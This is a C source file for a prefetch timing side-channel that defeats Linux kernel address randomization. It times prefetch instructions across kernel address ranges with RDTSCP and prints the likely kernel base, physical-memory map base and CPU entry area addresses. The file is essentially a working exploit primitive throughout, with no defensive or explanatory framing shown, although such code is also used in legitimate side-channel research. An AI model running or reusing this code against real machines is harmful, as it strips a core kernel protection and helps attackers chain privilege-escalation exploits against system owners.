#define _GNU_SOURCE

#include "prefetch.h"

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

static inline void prefetch(void *p)
{
    asm volatile("prefetchnta (%0)"
                 :
                 : "r"(p));
    asm volatile("prefetcht2 (%0)"
                 :
                 : "r"(p));
}
#if DEBUG == 1
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...)
#endif
static inline size_t onlyreload(void *addr) //time a prefetch
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

struct results start_test(void *start, void *end, unsigned long step, enum analysis_type mode)
{
    DEBUG_PRINT("Collecting data...\n");
    unsigned num_slots = ((unsigned long)end - (unsigned long)start) / step;
    unsigned long entries[num_slots][ITERATIONS];
    /*                   COLLECT               */
    // These loops are nested so that we spread slowdown entropy across all of the potential slots, instead of just one but in practice
    // it doesn't matter
    for (unsigned i = 0; i < ITERATIONS; i++)
    {
        unsigned slot = 0;
        for(char *addr = start; addr < (char *)end; addr = addr + step, slot++)
        {
            entries[slot][i] = onlyreload(addr);
        }
    }

    /*                     ANALYZE                */
    if (mode == MINIMUM || mode == MAXIMUM) //Find the smallest measurement time in the array, if a tie, take the first.
    {
        unsigned long min_slot_min = 0xffffffffffffffff, max_min = 0, min_slot_average, max_min_slot_average, min_slot,max_min_slot;
        unsigned num_min = 0;
        for (unsigned i = 0; i < num_slots; i++)
        {
            unsigned long max = 0, min = 0xffffffffffffffff, sum = 0;
            for (unsigned j = 0; j < ITERATIONS; j++)
            {
                unsigned long measurement = entries[i][j];
                if (measurement < min)
                    min = measurement;
                if (measurement > max)
                    max = measurement;
                sum += measurement;
            }
            if (min < min_slot_min)
            {
                min_slot_min = min;
                min_slot = i;
                min_slot_average = sum >> IORDER;
                num_min = 0;
            } else if (min == min_slot_min)
                num_min++;
            if(min > max_min) {
                max_min = min;
                max_min_slot = i;
                max_min_slot_average = sum >> IORDER;
            }
            DEBUG_PRINT("%p : Max %lu Min %lu Average %lu\n", start + i * step, max, min, sum >> IORDER);
        }

        struct results r;
        //r.significant = min_slot_min + 5 * num_min < max_min;
        r.significant = min_slot_min + 20 < max_min; //A really really cruddy way of determining statistical significance. 
        r.addr = mode == MINIMUM ? start + step * min_slot : start + step * max_min_slot;
        r.minimum = min_slot_min;
        r.average = mode == MINIMUM ? min_slot_average : max_min_slot_average;
        r.max_min = max_min;
        return r;
    }
    else if(mode == EDGE || mode == MIN_EDGE)
    {
        const unsigned AVERAGE = 0;
        const unsigned MIN = 1;
        unsigned long crunched_values[num_slots][2];
        long edges[num_slots];
        unsigned max_edge = 0,min_edge = 0;
        for(unsigned i = 0; i < num_slots; i++)
        {
            crunched_values[i][MIN] = (unsigned long) -1;
            crunched_values[i][AVERAGE] = 0;
            for(unsigned j = 0; j < ITERATIONS; j++)
            {
                crunched_values[i][AVERAGE] += entries[i][j];
                if(entries[i][j] < crunched_values[i][MIN])
                    crunched_values[i][MIN] = entries[i][j];
            }
            crunched_values[i][AVERAGE] >>= IORDER;
            edges[i] = i ? (long) crunched_values[i-1][MIN] - (long) crunched_values[i][MIN] : 0;
            if(edges[i] > edges[max_edge])
                max_edge = i;
            if(edges[i] < edges[min_edge])
                min_edge = i;
            DEBUG_PRINT("%p : Min %lu Average %lu Edge %ld\n", start + i * step, crunched_values[i][MIN], crunched_values[i][AVERAGE],edges[i]);

        }
        struct results r;
        r.addr = mode == EDGE ? start + step * max_edge : start + step * min_edge;
        r.minimum = crunched_values[max_edge][MIN];
        r.average = mode == EDGE ? crunched_values[max_edge][AVERAGE] : crunched_values[min_edge][AVERAGE];
        r.max_min = crunched_values[min_edge][MIN];
        return r;
    }
    else {
        puts("[FATAL] Unknown mode!!");
        exit(1);
        __builtin_unreachable();
    }
}
void* fetch_kaslr_base()
{
    void *start = (void *)0xffffffff80000000;
    void *end   = (void *)0xffffffffc0000000;
    unsigned long step = 0x0000000001000000;
    //struct results r = start_test(start,end,0x100000,EDGE);
    struct results r = start_test(start, end, step, MINIMUM);
    r = start_test(r.addr - 10 * step, r.addr + step, step, EDGE);
    r = start_test(r.addr - 2 * step, r.addr + 0x100000, 0x100000, EDGE);
    printf("Most likely kernel base address: %p\nWith average of: %lu\nAnd minimum of: %lu\n", r.addr, r.average, r.minimum);

    // struct results r = start_test(start, end, step,MAXIMUM);
    // r = start_test(r.addr - 10 * step, r.addr + step, step,MIN_EDGE);
    // r = start_test(r.addr - 2 * step, r.addr + 0x100000, 0x100000,MIN_EDGE);
    // printf("Most likely kernel base address: %p\nWith average of: %lu\nAnd minimum of: %lu\n", r.addr, r.average, r.max_min);
    return r.addr;
}
void* fetch_cea()
{
    for(unsigned long i = 0; i < 0x200000; i+=0x2000)
    {
        void* start = (void*) 0xfffffe0000001000 + i * 0x3b000;
        struct results r = start_test(start,start + (0x2000lu * 0x3b000lu),0x3b000,MINIMUM);
        if(r.significant)
            printf("likely cea address was %p with min of %lu\n",r.addr,r.minimum);
    }
    return NULL;
}

void* fetch_phy_base()
{
    void *start = (void *)0xffff888000000000;
    void *end   = (void *)0xfffffe0000000000;
    unsigned long step = 0x40000000;
    //struct results r = start_test(start,end,0x100000,EDGE);
    struct results r = start_test(start, end, step, MINIMUM);
    r = start_test(r.addr - 10 * step, r.addr + step, step, EDGE);
    r = start_test(r.addr - 2 * step, r.addr + step, step, EDGE);
    printf("Most likely phy base address: %p\nWith average of: %lu\nAnd minimum of: %lu\n", r.addr, r.average, r.minimum);

    return r.addr;
}